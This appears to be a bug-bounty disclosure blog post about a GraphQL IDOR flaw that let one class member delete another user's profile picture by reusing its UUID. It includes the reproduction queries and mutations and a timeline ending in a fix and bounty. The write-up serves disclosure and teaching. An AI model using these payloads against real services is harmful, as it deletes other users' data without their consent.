---
title: "Abusing GraphQL IDOR to Delete Another User's Profile Picture"
date: 2025-04-06
layout: post
---

<body>
<div class="container">
<header>
<h1>Abusing GraphQL IDOR to Delete Another User's Profile Picture</h1>
</header>
<p>This vulnerability stems from a subtle but critical flaw in the platform’s GraphQL implementation. The backend allowed profile pictures to be referenced via a shared <code>profile_picture_id</code> — but failed to enforce strict ownership validation when that ID was mutated via profile updates.</p>
<p>The exploit took advantage of how GraphQL resolvers returned deeply nested user data (including profile picture metadata) to unauthorized users within the same class/group context. By chaining this exposure with a mutation that reused the ID, the attacker could overwrite and delete a victim's profile picture — all through legitimate UI actions, amplified by crafted GraphQL queries.</p>
<h2>Context: GraphQL and Shared Media Objects</h2>
<p>Unlike REST APIs, GraphQL often returns large, nested response objects. In this case, a query like <code>getClassMembers</code> exposed each user's <code>profilePictureUrl</code>, from which the <code>profile_picture_id</code> could be extracted by parsing the URL. This ID wasn't scoped per user, and the backend didn’t verify that the current user had ownership of the referenced media object when reusing it in a mutation.</p>

<h2>Steps to Reproduce</h2>
<ol>
  <li>Create two accounts:
    <ul>
      <li><strong>User A</strong> (victim)</li>
      <li><strong>User B</strong> (attacker)</li>
    </ul>
  </li>
  <li>User A creates a “Class” and adds User B to it — establishing access context for viewing user details via GraphQL.</li>
  <li>User B performs a query like:</li>
</ol>

{% raw %}
<pre>
query {
  classMembers(classId: "xyz") {
    id
    name
    profilePictureUrl
  }
}
</pre>
{% endraw %}

<p>The returned <code>profilePictureUrl</code> contains a UUID — e.g.,</p>
<pre>https://cdn.example.com/images/<mark>cb227e3c-4bb3-42fc-8c29-b3030d6e86ab</mark>/avatar.png</pre>
<p>This UUID is the <code>profile_picture_id</code> used internally.</p>
<p>User B now uses a GraphQL mutation to update their own profile and sets:</p>

{% raw %}
<pre>
mutation {
  updateProfile(input: {
    profile_picture_id: "cb227e3c-4bb3-42fc-8c29-b3030d6e86ab"
  }) {
    success
  }
}
</pre>
{% endraw %}

<p>This effectively links both profiles to the same image.</p>
<p>To delete the image, the attacker either sends:</p>

{% raw %}
<pre>
mutation {
  updateProfile(input: {
    profile_picture_id: null
  }) {
    success
  }
}
</pre>
{% endraw %}

<p>Or performs a delete mutation if supported by the schema. Since the object is shared, it is removed globally — affecting the victim as well.</p>

<h2>Timeline</h2>
<ul>
<li>June 22, 2022 – Initial report submitted</li>
<li>June 23, 2022 – Closed as “Not Applicable”; later reopened</li>
<li>June 27 – Escalated to HackerOne support</li>
<li>July 1 – Triaged, validated</li>
<li>July 12 – Issue resolved and bounty awarded</li>
</ul>

<footer>
  Thanks, <br/> Anand
</footer>
</div>
</body>
